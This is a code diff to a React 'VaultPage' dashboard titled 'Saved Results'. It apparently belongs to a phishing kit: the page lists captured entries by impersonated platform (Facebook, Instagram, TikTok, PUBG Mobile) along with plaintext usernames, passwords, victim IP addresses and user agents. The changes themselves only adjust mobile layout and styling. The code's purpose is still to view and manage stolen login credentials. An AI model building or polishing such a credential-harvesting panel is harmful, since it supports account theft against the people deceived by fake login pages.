@@ -29,15 +29,15 @@ export default function VaultPage() {
   };
 
   return (
-    <div className="main-container animate-fade-in">
-      <header className="mb-12 flex items-center justify-between">
+    <div className="main-container animate-fade-in py-6 sm:py-12">
+      <header className="mb-8 sm:mb-12 flex flex-col sm:flex-row sm:items-center justify-between gap-6">
         <div>
-          <h1 className="text-4xl font-bold mb-2 tracking-tight">Saved <span className="text-gradient">Results</span></h1>
-          <p className="text-slate-500 text-sm font-medium">Everything you have collected is shown here.</p>
+          <h1 className="text-2xl sm:text-4xl font-bold mb-2 tracking-tight">Saved <span className="text-gradient">Results</span></h1>
+          <p className="text-slate-500 text-xs sm:text-sm font-medium">Everything you have collected is shown here.</p>
         </div>
         <button 
           onClick={() => window.location.reload()}
-          className="px-6 py-3 bg-white/60 hover:bg-white border border-white/50 rounded-2xl text-xs font-black uppercase tracking-widest text-slate-600 transition-all shadow-sm active:scale-95 glass"
+          className="w-full sm:w-auto px-6 py-3 bg-white/60 hover:bg-white border border-white/50 rounded-xl sm:rounded-2xl text-[10px] sm:text-xs font-black uppercase tracking-widest text-slate-600 transition-all shadow-sm active:scale-95 glass"
         >
           Refresh Data
         </button>
@@ -48,11 +48,11 @@ export default function VaultPage() {
           <table className="w-full text-left">
             <thead>
               <tr className="bg-slate-50 text-slate-400 text-[10px] sm:text-xs font-bold uppercase tracking-widest">
-                <th className="px-4 sm:px-8 py-5">Source</th>
-                <th className="px-4 sm:px-8 py-5">User Info</th>
-                <th className="px-4 sm:px-8 py-5 hidden md:table-cell">Details</th>
-                <th className="px-4 sm:px-8 py-5 hidden sm:table-cell">Time</th>
-                <th className="px-4 sm:px-8 py-5 text-right">Actions</th>
+                <th className="px-3 sm:px-8 py-4 sm:py-5">Source</th>
+                <th className="px-3 sm:px-8 py-4 sm:py-5">User Info</th>
+                <th className="px-4 py-5 hidden md:table-cell">Details</th>
+                <th className="px-4 py-5 hidden sm:table-cell">Time</th>
+                <th className="px-3 sm:px-8 py-4 sm:py-5 text-right">Action</th>
               </tr>
             </thead>
             <tbody className="divide-y divide-slate-100">
@@ -67,45 +67,45 @@ export default function VaultPage() {
               ) : (
                 data.map((entry) => (
                   <tr key={entry.id} className="hover:bg-slate-50/50 transition-colors">
-                    <td className="px-4 sm:px-8 py-6">
-                      <div className="flex items-center gap-3">
-                        <div className="w-10 h-10 rounded-xl bg-indigo-50 flex items-center justify-center text-lg border border-indigo-100 shadow-sm">
+                    <td className="px-3 sm:px-8 py-4 sm:py-6">
+                      <div className="flex items-center gap-2 sm:gap-3">
+                        <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-lg sm:rounded-xl bg-indigo-50 flex items-center justify-center text-base sm:text-lg border border-indigo-100 shadow-sm shrink-0">
                           {entry.tool === "Facebook" ? "👤" : entry.tool === "Instagram" ? "📸" : entry.tool === "TikTok" ? "🎵" : entry.tool === "PUBG Mobile" ? "🔫" : "🌙"}
                         </div>
-                        <div>
-                           <span className="block font-bold text-slate-800 text-sm sm:text-base">{entry.tool}</span>
-                           <span className="block text-[10px] font-mono text-slate-400">/t/{entry.toolId}</span>
+                        <div className="min-w-0">
+                           <span className="block font-bold text-slate-800 text-xs sm:text-base truncate">{entry.tool}</span>
+                           <span className="block text-[8px] sm:text-[10px] font-mono text-slate-400">/t/{entry.toolId}</span>
                         </div>
                       </div>
                     </td>
-                    <td className="px-4 sm:px-8 py-6">
-                      <div className="flex flex-col gap-1.5">
-                        <div className="flex items-center gap-2">
-                          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-tighter">UID:</span>
-                          <span className="text-xs sm:text-sm font-bold text-indigo-600 break-all bg-indigo-50 px-2 py-0.5 rounded">{entry.username}</span>
+                    <td className="px-3 sm:px-8 py-4 sm:py-6">
+                      <div className="flex flex-col gap-1 sm:gap-1.5">
+                        <div className="flex items-center gap-1.5 sm:gap-2">
+                          <span className="text-[8px] sm:text-[10px] text-slate-400 font-bold uppercase tracking-tighter shrink-0">UID:</span>
+                          <span className="text-[10px] sm:text-sm font-bold text-indigo-600 break-all bg-indigo-50 px-1.5 sm:px-2 py-0.5 rounded">{entry.username}</span>
                         </div>
-                        <div className="flex items-center gap-2">
-                          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-tighter">PWD:</span>
-                          <span className="text-xs sm:text-sm font-bold text-pink-600 break-all bg-pink-50 px-2 py-0.5 rounded">{entry.password}</span>
+                        <div className="flex items-center gap-1.5 sm:gap-2">
+                          <span className="text-[8px] sm:text-[10px] text-slate-400 font-bold uppercase tracking-tighter shrink-0">PWD:</span>
+                          <span className="text-[10px] sm:text-sm font-bold text-pink-600 break-all bg-pink-50 px-1.5 sm:px-2 py-0.5 rounded">{entry.password}</span>
                         </div>
                       </div>
                     </td>
-                    <td className="px-4 sm:px-8 py-6 hidden md:table-cell">
+                    <td className="px-4 py-6 hidden md:table-cell">
                       <div className="flex flex-col">
                         <span className="text-sm text-slate-700 font-bold font-mono">{entry.ip}</span>
                         <span className="text-[10px] text-slate-400 truncate max-w-[150px] font-medium">{entry.userAgent}</span>
                       </div>
                     </td>
-                    <td className="px-4 sm:px-8 py-6 hidden sm:table-cell">
+                    <td className="px-4 py-6 hidden sm:table-cell">
                       <span className="text-xs text-slate-500 font-medium">{new Date(entry.timestamp).toLocaleString()}</span>
                     </td>
-                    <td className="px-4 sm:px-8 py-6 text-right">
+                    <td className="px-3 sm:px-8 py-4 sm:py-6 text-right">
                       <button 
                         onClick={() => deleteEntry(entry.id)}
-                        className="p-2.5 hover:bg-red-50 rounded-xl transition-colors group border border-transparent hover:border-red-100"
+                        className="p-2 sm:p-2.5 hover:bg-red-50 rounded-lg sm:rounded-xl transition-colors group border border-transparent hover:border-red-100"
                         title="Delete record"
                       >
-                        <span className="text-red-400/60 group-hover:text-red-500 text-sm">🗑️</span>
+                        <span className="text-red-400/60 group-hover:text-red-500 text-sm sm:text-base">🗑️</span>
                       </button>
                     </td>
                   </tr>
